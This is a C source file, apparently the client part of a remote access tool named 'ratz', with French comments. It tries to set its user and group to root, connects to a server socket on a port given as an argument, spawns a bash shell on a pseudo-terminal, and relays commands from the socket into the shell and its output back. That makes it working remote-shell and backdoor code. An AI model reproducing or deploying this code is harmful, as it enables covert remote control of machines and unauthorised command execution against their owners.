/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

# include "ratz.h"
# include "slave.h"

void	connect_to_server(s_ratz* ratz)
{
	if ((ratz->server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		strexit("socket", 1);
	ratz_set_addri(&ratz->addri, AF_INET, LOCALHOST, ratz->raw_port);
	if (connect(ratz->server, (const s_sockaddr*)&ratz->addri, sizeof(ratz->addri)) == -1)
		strexit("connect", 1);
}

void	create_ptm(s_blue* blue)
{
	if ((blue->master = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
		strexit("posix_openpt", 1);
	else if (grantpt(blue->master) == -1)
		strexit("grantpt", 1);
	else if (unlockpt(blue->master) == -1)
		strexit("unlockpt", 1);
}

void	open_pts(s_blue* blue)
{
	char*	slave_name = ptsname(blue->master);
	if (!slave_name)
		strexit("ptsname", 1);
	else if ((blue->slave = open(slave_name, O_RDWR | O_NOCTTY)) == -1)
		strexit("open pts", 1);
}

// Le terminal associé au 'fd' devient le terminal de controle de la session
static inline
void	set_ttctrl(int fd)
{
	ioctl(fd, TIOCSCTTY, 0);
}

void	setup_slave(s_blue* blue)
{
	setsid(); // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
	open_pts(blue); // Ouvre le terminal esclave
	set_ttctrl(blue->slave); // Le terminal associé au 'fd' devient le terminal de controle de la session
}

void	set_slave_state(int slave_fd)
{
	dup2(slave_fd, STDIN_FILENO);
	dup2(slave_fd, STDOUT_FILENO);
	//dup2(slave_fd, STDERR_FILENO);
	close(slave_fd);
}

int	try_set_root()
{
	return (setuid(0) | setgid(0));
}

int	main(int, char** av)
{
	try_set_root();

	int		chd;
	s_blue	blue;
	memset(&blue, 0, sizeof(blue));

	blue.ratz.raw_port = ratz__get_port_method(av[1]);
	connect_to_server(&blue.ratz);
	create_ptm(&blue);

	chd = fork();
	if (chd == -1)
		strexit("fork", 1);
	else if (chd == 0)
	{
		setup_slave(&blue);
		set_slave_state(blue.slave);
		close(blue.ratz.server);
		close(blue.master);
		setenv("PS1", CTRL_PROMPT, 1);
		setenv("TERM", "dumb", 1);
		if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
			strexit("execlp", 2);
	}
	else
	{
		close(blue.slave);
		char	cmd[DEBUG_SIZE_MAX] = {0};
		int		n;
		fcntl(blue.ratz.server, F_SETFL, ~O_NONBLOCK);
		fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
		while (waitpid(chd, NULL, WNOHANG) == 0)
		{
			n = read(blue.ratz.server, cmd, DEBUG_SIZE_MAX);
			cmd[n] = '\0';
			write(blue.master, cmd, n);
			write(blue.master, "\n", 1);
			sleep(1); // Better soon. How to know if a command-line has finished his execution ??
			n = read(blue.master, cmd, DEBUG_SIZE_MAX);
			cmd[n] = '\0';
			write(blue.ratz.server, cmd, n);
		}
	}
	return (0);
}
